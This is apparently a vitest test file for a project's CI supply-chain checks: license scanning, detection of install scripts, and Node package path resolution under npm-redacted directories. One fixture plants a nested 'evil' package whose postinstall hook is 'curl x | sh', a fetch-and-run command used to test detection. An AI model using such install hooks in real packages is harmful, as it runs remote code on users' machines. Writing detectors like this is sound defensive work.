// ci-redacted-paths.test.ts — the supply-chain checks (docs/plan/04 §4.1 `supply-chain`) must read
// every runtime package from where it is installed, whatever directory the checkout sits in. npm
// prints a UUID-like path segment as `***` in `npm ls --json` (its secret redaction), so a path
// copied from that output names no file: a checkout under such a directory failed every package
// with ENOENT instead of checking it.
import { mkdirSync } from "node:fs";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { flattenTree, manifestDir, resolveInstalled } from "../../scripts/ci/_lib.mjs";
import { fakeProject, runCheck, tempDir, writeTree } from "./helpers.js";

/** A directory name npm's redaction rewrites (a v4 UUID); every case below sits under one. */
const UUID_SEGMENTS = [
  "3f2a9c1e-8b7d-4e6f-9a0b-1c2d3e4f5a6b",
  "d5526a03-c41f-479e-9a26-3ea729ce04cc",
  "00000000-0000-4000-8000-000000000000",
];

describe("check-licenses and check-no-scripts under a UUID-named directory", () => {
  let tmp: ReturnType<typeof tempDir> | undefined;
  afterEach(() => tmp?.cleanup());

  /** A project root under `<tmp>/<uuid>/proj`. */
  const projectUnder = (segment: string): string => {
    tmp = tempDir();
    const root = path.join(tmp.dir, segment, "proj");
    mkdirSync(root, { recursive: true });
    return root;
  };

  it.each(UUID_SEGMENTS)("a clean tree passes both checks (under %s)", (segment) => {
    const root = projectUnder(segment);
    fakeProject(root, { ok: { license: "MIT" }, other: { license: "ISC" } });
    for (const script of ["check-licenses.mjs", "check-no-scripts.mjs"]) {
      const r = runCheck(script, ["--root", root]);
      expect(r.stderr, script).not.toContain("ENOENT");
      expect(r.stderr, script).not.toContain("cannot read");
      expect(r.status, `${script}: ${r.stderr}`).toBe(0);
    }
  });

  it.each(UUID_SEGMENTS)(
    "a disallowed license is still found and named for its license (under %s)",
    (segment) => {
      const root = projectUnder(segment);
      fakeProject(root, { ok: { license: "MIT" }, copyleft: { license: "GPL-3.0-only" } });
      const r = runCheck("check-licenses.mjs", ["--root", root]);
      expect(r.status).toBe(1);
      expect(r.stderr).toContain('copyleft@1.0.0: license "GPL-3.0-only"');
      expect(r.stderr).not.toContain("ok@1.0.0");
      expect(r.stderr).not.toContain("cannot read");
    },
  );

  it.each(UUID_SEGMENTS)(
    "an install hook two levels down is still found and named (under %s)",
    (segment) => {
      const root = projectUnder(segment);
      fakeProject(root, { good: { dependencies: { evil: "1.0.0" } } });
      writeTree(root, {
        "node_modules/good/node_modules/evil/package.json": {
          name: "evil",
          version: "1.0.0",
          scripts: { postinstall: "curl x | sh" },
        },
      });
      const r = runCheck("check-no-scripts.mjs", ["--root", root]);
      expect(r.status).toBe(1);
      expect(r.stderr).toContain('evil@1.0.0: has a "postinstall" script');
      expect(r.stderr).not.toContain("cannot read");
    },
  );
});

describe("resolveInstalled (Node's lookup, bounded by the project root)", () => {
  let tmp: ReturnType<typeof tempDir> | undefined;
  afterEach(() => tmp?.cleanup());

  it("prefers the copy nested under the requiring package over the hoisted one", () => {
    tmp = tempDir();
    const root = tmp.dir;
    writeTree(root, {
      "node_modules/c/package.json": { name: "c", version: "3.0.0" },
      "node_modules/a/package.json": { name: "a", version: "1.0.0" },
      "node_modules/a/node_modules/c/package.json": { name: "c", version: "4.0.0" },
      "node_modules/b/package.json": { name: "b", version: "2.0.0" },
    });
    const a = path.join(root, "node_modules", "a");
    const b = path.join(root, "node_modules", "b");
    expect(resolveInstalled("c", a, root)).toBe(path.join(a, "node_modules", "c"));
    expect(resolveInstalled("c", b, root)).toBe(path.join(root, "node_modules", "c"));
    expect(resolveInstalled("a", root, root)).toBe(a);
  });

  it("finds a scoped package, and from inside a scope folder", () => {
    tmp = tempDir();
    const root = tmp.dir;
    writeTree(root, {
      "node_modules/@s/x/package.json": { name: "@s/x", version: "1.0.0" },
      "node_modules/@s/y/package.json": { name: "@s/y", version: "1.0.0" },
    });
    const x = path.join(root, "node_modules", "@s", "x");
    expect(resolveInstalled("@s/x", root, root)).toBe(x);
    expect(resolveInstalled("@s/y", x, root)).toBe(path.join(root, "node_modules", "@s", "y"));
  });

  it("returns null when no directory up to the root holds the package", () => {
    tmp = tempDir();
    const root = path.join(tmp.dir, "proj");
    writeTree(tmp.dir, {
      // above the project root: never a member of this project's tree
      "node_modules/outside/package.json": { name: "outside", version: "1.0.0" },
      "proj/package.json": { name: "p", version: "1.0.0" },
      // a folder without a package.json is not an installed package
      "proj/node_modules/empty/README": "x",
    });
    expect(resolveInstalled("outside", root, root)).toBeNull();
    expect(resolveInstalled("empty", root, root)).toBeNull();
    expect(resolveInstalled("ghost", root, root)).toBeNull();
  });
});

describe("flattenTree with a root: directories come from the disk, never from npm's text", () => {
  let tmp: ReturnType<typeof tempDir> | undefined;
  afterEach(() => tmp?.cleanup());

  it("places each name@version where it is installed although every printed path is redacted", () => {
    tmp = tempDir();
    const root = tmp.dir;
    writeTree(root, {
      "node_modules/a/package.json": { name: "a", version: "1.0.0" },
      "node_modules/a/node_modules/c/package.json": { name: "c", version: "4.0.0" },
      "node_modules/b/package.json": { name: "b", version: "2.0.0" },
      "node_modules/c/package.json": { name: "c", version: "3.0.0" },
    });
    const t = flattenTree(
      {
        path: "/***/proj",
        dependencies: {
          a: {
            version: "1.0.0",
            path: "/***/proj/node_modules/a",
            dependencies: {
              c: { version: "4.0.0", path: "/***/proj/node_modules/a/node_modules/c" },
            },
          },
          b: {
            version: "2.0.0",
            path: "/***/proj/node_modules/b",
            dependencies: { c: { version: "3.0.0" } },
          },
          c: { version: "3.0.0", path: "/***/proj/node_modules/c" },
        },
      },
      root,
    );
    const dir = (key: string): string => {
      const node = t.nodes.get(key);
      if (node === undefined) throw new Error(`no node ${key}`);
      return manifestDir(node, root);
    };
    expect(dir("a@1.0.0")).toBe(path.join(root, "node_modules", "a"));
    expect(dir("b@2.0.0")).toBe(path.join(root, "node_modules", "b"));
    expect(dir("c@4.0.0")).toBe(path.join(root, "node_modules", "a", "node_modules", "c"));
    expect(dir("c@3.0.0")).toBe(path.join(root, "node_modules", "c"));
    for (const node of t.nodes.values()) expect(manifestDir(node, root)).not.toContain("***");
  });

  it("falls back to npm's printed path when the lookup finds nothing and that path exists", () => {
    tmp = tempDir();
    const root = path.join(tmp.dir, "proj");
    const elsewhere = path.join(tmp.dir, "linked-target");
    writeTree(tmp.dir, {
      "proj/package.json": { name: "p", version: "1.0.0" },
      "linked-target/package.json": { name: "l", version: "1.0.0" },
    });
    const t = flattenTree({ dependencies: { l: { version: "1.0.0", path: elsewhere } } }, root);
    const node = t.nodes.get("l@1.0.0");
    expect(node && manifestDir(node, root)).toBe(elsewhere);
  });
});
